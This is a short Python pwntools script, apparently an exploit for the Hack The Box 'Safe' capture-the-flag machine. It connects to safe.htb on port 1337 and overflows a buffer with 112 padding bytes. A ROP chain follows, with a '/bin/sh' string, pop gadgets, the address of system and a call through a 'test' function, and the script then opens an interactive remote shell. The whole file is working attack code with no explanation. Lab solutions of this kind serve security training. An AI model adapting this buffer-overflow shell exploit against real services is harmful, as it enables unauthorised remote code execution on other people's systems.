from pwn import *
import time

ip = 'safe.htb'
port = 1337

eip = b'A' * 112

rop = b''
rop += "/bin/sh\x00".encode() #/bin/sh
rop += p64(0x401206) # pop r13; pop r14; pop r15; ret
rop += p64(0x40116e) # Address of system
rop += p64(0x0) # null r14
rop += p64(0x0) # null r15
rop += p64(0x401152) #Address of test

payload = eip + rop

exploit = remote(ip,port)
exploit.sendline(payload)

exploit.interactive()
